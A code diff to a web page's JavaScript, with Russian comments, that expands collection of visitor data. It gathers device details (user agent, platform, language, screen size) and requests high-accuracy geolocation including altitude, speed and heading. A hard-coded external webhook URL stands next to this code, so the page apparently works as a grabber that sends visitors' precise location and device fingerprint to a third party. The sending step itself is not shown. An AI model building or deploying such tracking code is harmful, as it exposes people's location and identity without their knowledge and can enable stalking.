@@ -102,30 +102,47 @@
     const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";
 
     // Объект для хранения информации об устройстве и геолокации
-    const clientInfo = {
-      geolocation: {},
-      device: {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenResolution: window.screen.width + "x" + window.screen.height
-      }
-    };
-
-    // Запрос геолокации
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(position => {
-        clientInfo.geolocation = {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy
-        };
-      }, error => {
-        console.error('Ошибка получения геолокации:', error);
-      });
-    } else {
-      console.error('Геолокация не поддерживается данным браузером');
+  const clientInfo = {
+    geolocation: {},
+    device: {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenResolution: `${window.screen.width}x${window.screen.height}`
     }
+  };
+
+  // Запрос геолокации с повышенной точностью
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      position => {
+        const coords = position.coords;
+
+        clientInfo.geolocation = {
+          latitude: coords.latitude,
+          longitude: coords.longitude,
+          accuracy: coords.accuracy, // точность в метрах
+          altitude: coords.altitude || null,
+          altitudeAccuracy: coords.altitudeAccuracy || null,
+          heading: coords.heading || null,
+          speed: coords.speed || null,
+          timestamp: position.timestamp
+        };
+      },
+      error => {
+        console.error('Ошибка получения геолокации:', error.message);
+        clientInfo.geolocation = { error: error.message };
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      }
+    );
+  } else {
+    console.error('Геолокация не поддерживается данным браузером');
+    clientInfo.geolocation = { error: 'Geolocation not supported' };
+  }
 
     // Функция для декодирования Base64-параметров и парсинга строки
     function decodeBase64Params(base64Str) {
